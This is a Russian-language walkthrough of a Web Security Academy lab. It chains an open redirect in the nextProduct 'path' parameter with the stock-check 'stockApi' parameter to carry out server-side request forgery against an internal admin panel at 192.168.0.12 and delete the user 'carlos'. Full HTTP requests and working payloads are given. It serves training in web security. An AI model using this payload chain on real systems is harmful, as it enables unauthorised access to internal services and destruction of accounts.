
Есть функция проверки запасов, которая извлекает данные из внутренней системы.

## Дано

`http://192.168.0.12:8080/admin` - путь к админке
уязвимость открытого перенаправления
## Задача

удалить пользователя `carlos` в админке 


# Разведка

Запрос закодирован в url, формат только спец символы 

```
POST /product/stock HTTP/2
Host: 0a9900a703769b1cc27acc3e00a00089.web-security-academy.net
Cookie: session=gjJKr5o8fthZvLrDk4VLpU51KNj9WJX8; session=C7suQ10KIAC01QWow4I3DF8n5yiXcE77
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a9900a703769b1cc27acc3e00a00089.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0a9900a703769b1cc27acc3e00a00089.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers
Connection: keep-alive

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- `%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1` - ответ 200
- `%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1` - ответ 400

Так же есть функция перенаправления следующего товара
```
GET /product/nextProduct?currentProductId=2 HTTP/2
Host: 0a9900a703769b1cc27acc3e00a00089.web-security-academy.net
Cookie: session=aGmoHYJknfYUcmBZlsSx8lglJR1Ug68j; session=C7suQ10KIAC01QWow4I3DF8n5yiXcE77
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a9900a703769b1cc27acc3e00a00089.web-security-academy.net/product?productId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```
- уязвима к переадресации &path=https://google.com
# Атака

Используем функцию перенаправления товара на путь к к админ панели 
&path=http://192.168.0.12:8080/admin
![[Pasted image 20250123094645.png]]
- и это нам ничерта не дало, так как надо было указать путь в stockApi

Формат отправки запроса
```
POST /product/stock HTTP/2
Host: 0a9900a703769b1cc27acc3e00a00089.web-security-academy.net
Cookie: session=gjJKr5o8fthZvLrDk4VLpU51KNj9WJX8; session=C7suQ10KIAC01QWow4I3DF8n5yiXcE77
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a9900a703769b1cc27acc3e00a00089.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0a9900a703769b1cc27acc3e00a00089.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers
Connection: keep-alive

stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin
```
- /product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin

Удалить клиента
- /http://192.168.0.12:8080/admin/delete?username=carlos